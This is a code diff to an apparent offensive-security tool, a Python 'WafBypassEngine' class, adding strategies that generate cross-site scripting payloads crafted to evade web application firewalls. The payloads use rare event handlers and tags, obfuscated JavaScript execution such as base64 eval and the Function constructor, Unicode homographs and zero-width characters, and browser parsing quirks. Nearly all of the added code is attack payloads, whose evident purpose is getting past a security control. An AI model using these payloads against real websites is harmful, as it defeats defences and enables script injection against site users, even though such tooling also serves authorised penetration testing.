@@ -446,7 +446,88 @@ class WafBypassEngine:
                     "confidence": "low",
                 })
 
-        return bypasses[:30]  # Cap at 30
+        # Strategy 6: Uncommon event handlers not in typical WAF signature databases
+        uncommon_events = [
+            "onpointerrawupdate", "onbeforetoggle", "onsecuritypolicyviolation",
+            "onscrollend", "oncontentvisibilityautostatechange",
+            "onformdata", "onbeforexrselect",
+        ]
+        for event in uncommon_events:
+            if event not in profile.blocked_keywords:
+                bypasses.append({
+                    "payload": f"<div {event}=alert(1)>",
+                    "technique": f"uncommon_event_{event}",
+                    "confidence": "medium",
+                })
+
+        # Strategy 7: Uncommon HTML tags not typically blocked by WAFs
+        uncommon_tags = {
+            "search": "<search onfocus=alert(1) autofocus tabindex=0>",
+            "dialog": "<dialog open onclose=alert(1)>",
+            "menu": "<menu id=x><button onclick=alert(1)>",
+            "slot": "<slot onslotchange=alert(1)>",
+            "template": "<template><img src=x onerror=alert(1)></template>",
+        }
+        for tag_name, payload in uncommon_tags.items():
+            if tag_name not in profile.blocked_keywords:
+                bypasses.append({
+                    "payload": payload,
+                    "technique": f"uncommon_tag_{tag_name}",
+                    "confidence": "medium",
+                })
+
+        # Strategy 8: JS execution alternatives (when alert/confirm/prompt ALL blocked)
+        js_alternatives = [
+            ("eval(atob('YWxlcnQoMSk='))", "base64_eval"),
+            ("setTimeout('ale'+'rt(1)')", "settimeout_concat"),
+            ("Function('ale'+'rt(1)')()", "function_constructor_concat"),
+            ("Reflect.apply(alert,null,[1])", "reflect_apply"),
+            ("import('data:text/javascript,alert(1)')", "dynamic_import"),
+        ]
+        all_exec_blocked = all(
+            k in profile.blocked_keywords for k in ("alert", "confirm", "prompt")
+        )
+        if all_exec_blocked:
+            for js_payload, technique in js_alternatives:
+                bypasses.append({
+                    "payload": f"<img src=x onerror={js_payload}>",
+                    "technique": f"js_alt_{technique}",
+                    "confidence": "medium",
+                })
+
+        # Strategy 9: Unicode/encoding tricks
+        unicode_tricks = [
+            ("\uff1cscript\uff1ealert(1)\uff1c/script\uff1e", "fullwidth_angle_brackets"),
+            ("<s\u200ccript>alert(1)</s\u200ccript>", "zero_width_joiner"),
+            ("<\ua731cript>alert(1)</\ua731cript>", "homograph_s"),
+            ("\u202e<script>alert(1)</script>", "rtl_override"),
+            ("<scr\u200bipt>alert(1)</scr\u200bipt>", "zero_width_space"),
+        ]
+        for payload, technique in unicode_tricks:
+            bypasses.append({
+                "payload": payload,
+                "technique": f"unicode_{technique}",
+                "confidence": "low",
+            })
+
+        # Strategy 10: Browser-specific quirks
+        browser_quirks = [
+            ("<scri%00pt>alert(1)</script>", "null_byte_insertion"),
+            ("<img src=x onerror%09=%09alert(1)>", "control_char_tab"),
+            ("<!--><img src=x onerror=alert(1)>-->", "comment_injection"),
+            ("<![CDATA[><img src=x onerror=alert(1)>]]>", "cdata_injection"),
+            ("<img src=`x` onerror=alert(1)>", "backtick_attributes"),
+            ("<img src=x onerror%0d=%0dalert(1)>", "control_char_cr"),
+            ("<img/src=x/onerror=alert(1)>", "slash_attribute_separator"),
+        ]
+        for payload, technique in browser_quirks:
+            bypasses.append({
+                "payload": payload,
+                "technique": f"browser_quirk_{technique}",
+                "confidence": "low",
+            })
+
+        return bypasses[:50]  # Cap at 50
 
     def generate_sqli_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
         """Generate SQLi payloads that bypass the profiled WAF."""
